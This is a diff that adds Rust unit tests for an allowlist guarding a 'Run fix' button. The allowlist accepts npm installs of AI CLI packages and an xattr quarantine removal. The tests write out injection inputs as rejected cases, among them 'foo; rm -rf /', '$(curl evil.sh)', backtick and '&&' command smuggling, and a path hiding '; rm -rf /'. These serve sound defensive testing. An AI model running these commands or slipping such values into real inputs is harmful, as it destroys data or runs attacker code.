@@ -210,6 +210,97 @@ fn extract_codesign_reason(stderr: &str) -> String {
     }
 }
 
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // The allowlist parser is the load-bearing security boundary for
+    // the "Run fix" button. Anything that gets past these tests would
+    // let a compromised IPC channel run arbitrary shell. Test both
+    // accepted shapes and a spread of rejected ones.
+
+    #[test]
+    fn accepts_canonical_npm_install() {
+        // We can't run npm in a unit test, but we can verify the
+        // parser routes to the npm branch instead of erroring out.
+        // The actual exec will fail in the test (npm-i to a fake pkg
+        // would either succeed or fail at the network layer); we only
+        // care that the rejection path doesn't fire.
+        let safe = is_safe_npm_pkg("@openai/codex@latest");
+        let safe2 = is_safe_npm_pkg("@anthropic-ai/claude-code@latest");
+        let safe3 = is_safe_npm_pkg("@google/gemini-cli@latest");
+        assert!(safe);
+        assert!(safe2);
+        assert!(safe3);
+    }
+
+    #[test]
+    fn rejects_shell_metacharacters_in_pkg() {
+        assert!(!is_safe_npm_pkg("foo; rm -rf /"));
+        assert!(!is_safe_npm_pkg("foo && whoami"));
+        assert!(!is_safe_npm_pkg("$(curl evil.sh)"));
+        assert!(!is_safe_npm_pkg("foo|cat"));
+        assert!(!is_safe_npm_pkg("foo bar"));   // space
+        assert!(!is_safe_npm_pkg("foo`id`"));
+        assert!(!is_safe_npm_pkg(""));
+    }
+
+    #[test]
+    fn unrecognized_shapes_are_rejected() {
+        // Anything that isn't one of the two allowlisted prefixes
+        // must short-circuit before exec.
+        let cases = [
+            "echo pwned",
+            "/bin/sh -c whoami",
+            "rm -rf ~",
+            "npm install -gX foo",          // mangled prefix
+            "xattr -d com.apple.quarantine; rm -rf /",  // injection attempt
+            "",
+        ];
+        for s in cases {
+            let result = runtime_health_run_fix(s.to_string());
+            assert!(
+                matches!(&result, Err(msg) if msg.contains("Refusing")),
+                "expected refusal for input {:?}, got {:?}",
+                s,
+                result
+            );
+        }
+    }
+
+    #[test]
+    fn xattr_rejects_path_with_semicolons() {
+        let r = runtime_health_run_fix(
+            "xattr -d com.apple.quarantine '/tmp/foo; rm -rf /'".into(),
+        );
+        assert!(
+            matches!(&r, Err(msg) if msg.contains("suspicious path") || msg.contains("Refusing")),
+            "got {:?}",
+            r
+        );
+    }
+
+    #[test]
+    fn xattr_accepts_clean_path() {
+        // We can't actually have a quarantined file to remove here,
+        // so the exec will fail. The parser must NOT reject it
+        // before exec — that's the contract being tested.
+        let r = runtime_health_run_fix(
+            "xattr -d com.apple.quarantine /tmp/this-file-does-not-exist".into(),
+        );
+        // Either Ok (xattr happened to succeed) or Err with a real
+        // exec error (not a "Refusing" allowlist rejection). Allowlist
+        // rejections are the bug; real exec errors are fine.
+        if let Err(msg) = &r {
+            assert!(
+                !msg.contains("Refusing"),
+                "allowlist incorrectly rejected clean path: {}",
+                msg
+            );
+        }
+    }
+}
+
 fn install_command_for(runtime: &str) -> Option<&'static str> {
     match runtime {
         "claude" => Some("npm install -g @anthropic-ai/claude-code@latest"),
